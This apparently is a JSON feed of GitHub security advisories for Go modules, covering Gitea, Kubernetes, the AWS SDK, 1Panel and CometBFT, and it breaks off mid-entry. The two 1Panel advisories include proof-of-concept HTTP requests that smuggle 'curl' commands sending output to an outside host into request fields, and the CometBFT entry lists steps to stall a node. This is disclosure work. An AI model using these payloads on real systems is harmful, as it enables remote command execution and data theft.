{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>Open Redirect in GitHub repository go-gitea/gitea prior to 1.19.4. This is most likely a post-auth redirect plus it is a POST based request scenario, so less likely that can be exploited or chained with other bugs that can cause phishing or credential theft.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-3515\">https://nvd.nist.gov/vuln/detail/CVE-2023-3515</a></li>\n<li><a href=\"https://github.com/go-gitea/gitea/commit/9aaaf980f0ba15611f30568bd67bce3ec12954e2\">https://github.com/go-gitea/gitea/commit/9aaaf980f0ba15611f30568bd67bce3ec12954e2</a></li>\n<li><a href=\"https://huntr.dev/bounties/e335cd18-bc4d-4585-adb7-426c817ed053\">https://huntr.dev/bounties/e335cd18-bc4d-4585-adb7-426c817ed053</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cf6v-9j57-v6r6\">https://github.com/advisories/GHSA-cf6v-9j57-v6r6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cf6v-9j57-v6r6",
            "title": "[code.gitea.io/gitea] code.gitea.io/gitea Open Redirect vulnerability",
            "date_modified": "2023-07-06T20:43:53.000Z",
            "date_published": "2023-07-05T15:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cf6v-9j57-v6r6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the <code>kubernetes.io/enforce-mountable-secrets</code> annotation are used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2728\">https://nvd.nist.gov/vuln/detail/CVE-2023-2728</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgcv-5272-97pr\">https://github.com/advisories/GHSA-cgcv-5272-97pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr",
            "title": "[k8s.io/kubernetes] Kubernetes mountable secrets policy bypass",
            "date_modified": "2023-07-06T15:10:06.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the <code>kubernetes.io/enforce-mountable-secrets</code> annotation are used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2728\">https://nvd.nist.gov/vuln/detail/CVE-2023-2728</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgcv-5272-97pr\">https://github.com/advisories/GHSA-cgcv-5272-97pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr",
            "title": "[k8s.io/kubernetes] Kubernetes mountable secrets policy bypass",
            "date_modified": "2023-07-06T15:10:06.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the <code>kubernetes.io/enforce-mountable-secrets</code> annotation are used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2728\">https://nvd.nist.gov/vuln/detail/CVE-2023-2728</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgcv-5272-97pr\">https://github.com/advisories/GHSA-cgcv-5272-97pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr",
            "title": "[k8s.io/kubernetes] Kubernetes mountable secrets policy bypass",
            "date_modified": "2023-07-06T15:10:06.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the <code>kubernetes.io/enforce-mountable-secrets</code> annotation are used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2728\">https://nvd.nist.gov/vuln/detail/CVE-2023-2728</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgcv-5272-97pr\">https://github.com/advisories/GHSA-cgcv-5272-97pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr",
            "title": "[k8s.io/kubernetes] Kubernetes mountable secrets policy bypass",
            "date_modified": "2023-07-06T15:10:06.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgcv-5272-97pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext, if the hash is readable to the attacker. AWS now blocks this metadata field, but older SDK versions still send it.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2582\">https://nvd.nist.gov/vuln/detail/CVE-2022-2582</a></li>\n<li><a href=\"https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1\">https://github.com/aws/aws-sdk-go/commit/35fa6ddf45c061e0f08d3a3b5119f8f4da38f6d1</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-0391\">https://pkg.go.dev/vuln/GO-2022-0391</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6jvc-q2x7-pchv\">https://github.com/advisories/GHSA-6jvc-q2x7-pchv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6jvc-q2x7-pchv",
            "title": "[github.com/aws/aws-sdk-go] AWS S3 Crypto SDK sends an unencrypted hash of the plaintext alongside the ciphertext as a metadata field",
            "date_modified": "2023-07-05T23:00:26.000Z",
            "date_published": "2022-12-28T00:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6jvc-q2x7-pchv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2727\">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc2g-gmh6-95p4\">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4",
            "title": "[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass",
            "date_modified": "2023-07-05T22:46:59.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2727\">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc2g-gmh6-95p4\">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4",
            "title": "[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass",
            "date_modified": "2023-07-05T22:46:59.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2727\">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc2g-gmh6-95p4\">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4",
            "title": "[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass",
            "date_modified": "2023-07-05T22:46:59.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-2727\">https://nvd.nist.gov/vuln/detail/CVE-2023-2727</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/118640\">https://github.com/kubernetes/kubernetes/issues/118640</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8\">https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118356\">https://github.com/kubernetes/kubernetes/pull/118356</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118471\">https://github.com/kubernetes/kubernetes/pull/118471</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118473\">https://github.com/kubernetes/kubernetes/pull/118473</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118474\">https://github.com/kubernetes/kubernetes/pull/118474</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/pull/118512\">https://github.com/kubernetes/kubernetes/pull/118512</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc2g-gmh6-95p4\">https://github.com/advisories/GHSA-qc2g-gmh6-95p4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4",
            "title": "[k8s.io/kubernetes] kube-apiserver vulnerable to policy bypass",
            "date_modified": "2023-07-05T22:46:59.000Z",
            "date_published": "2023-07-03T21:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc2g-gmh6-95p4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.</p>\n<ol>\n<li>Vulnerability analysis.</li>\n</ol>\n<pre><code>backend\\app\\api\\v1\\terminal.go#ContainerWsSsh\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png\"></p>\n<ol start=\"2\">\n<li>vulnerability reproduction.</li>\n</ol>\n<pre><code>GET /api/v1/containers/exec?cols=80&amp;rows=24&amp;containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&amp;user=asd&amp;command=/bin/bash HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nSec-WebSocket-Version: 13\nOrigin: http://192.168.109.152:40982\nSec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==\nConnection: keep-alive, Upgrade\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\nPragma: no-cache\nCache-Control: no-cache\nUpgrade: websocket\n</code></pre>\n<ol start=\"3\">\n<li>The successful execution of system commands.\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png\"></li>\n</ol>\n<p>Affected versions: &lt;= 1.3.5</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been fixed in v1.3.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is recommended to upgrade the version to v1.3.6.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/1Panel-dev/1Panel\">https://github.com/1Panel-dev/1Panel</a>\nEmail us at <a href=\"mailto:wanghe@fit2cloud.com\">wanghe@fit2cloud.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36458\">https://nvd.nist.gov/vuln/detail/CVE-2023-36458</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6\">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7x2c-fgx6-xf9h\">https://github.com/advisories/GHSA-7x2c-fgx6-xf9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7x2c-fgx6-xf9h",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel vulnerable to ommand injection when entering the container terminal",
            "date_modified": "2023-07-05T21:38:55.000Z",
            "date_published": "2023-07-05T21:38:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7x2c-fgx6-xf9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.</p>\n<ol>\n<li>Vulnerability analysis.</li>\n</ol>\n<pre><code>backend\\app\\api\\v1\\image_repo.go#create\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png\"></p>\n<pre><code>backend\\app\\service\\image_repo.go#CheckConn\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png\"></p>\n<ol start=\"2\">\n<li>vulnerability reproduction.</li>\n</ol>\n<pre><code>POST /api/v1/containers/repo HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 446\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n</code></pre>\n<pre><code>{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`ls`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n</code></pre>\n<ol start=\"3\">\n<li>Using update can be triggered multiple times.</li>\n</ol>\n<pre><code>POST /api/v1/containers/repo/update HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 447\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n</code></pre>\n<pre><code>{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`pwd`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n</code></pre>\n<p>Affected versions: &lt;= 1.3.5</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been fixed in v1.3.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is recommended to upgrade the version to v1.3.6.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/1Panel-dev/1Panel\">https://github.com/1Panel-dev/1Panel</a>\nEmail us at <a href=\"mailto:wanghe@fit2cloud.com\">wanghe@fit2cloud.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36457\">https://nvd.nist.gov/vuln/detail/CVE-2023-36457</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6\">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q2mx-gpjf-3h8x\">https://github.com/advisories/GHSA-q2mx-gpjf-3h8x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q2mx-gpjf-3h8x",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel vulnerable to command injection when adding container repositories",
            "date_modified": "2023-07-05T21:38:07.000Z",
            "date_published": "2023-07-05T21:38:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q2mx-gpjf-3h8x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>\n<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.</p>\n<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>\n<ol>\n<li>send transaction tx1 to the target full node via RPC</li>\n<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>\n<li>send transaction tx1 again to the target full node</li>\n</ol>\n<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>\n<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>\n<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/890\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>\n<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">PR</a> that introduced the map to track transactions in the mempool.</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">PR</a> containing the fix.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm\">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34451\">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">https://github.com/cometbft/cometbft/pull/890</a></li>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">https://github.com/tendermint/tendermint/pull/2778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w24w-wp77-qffm\">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm",
            "title": "[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures",
            "date_modified": "2023-07-05T21:34:54.000Z",
            "date_published": "2023-07-05T21:34:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm"
            },
            "tags": [
                "severity"
            ]
        },
        {
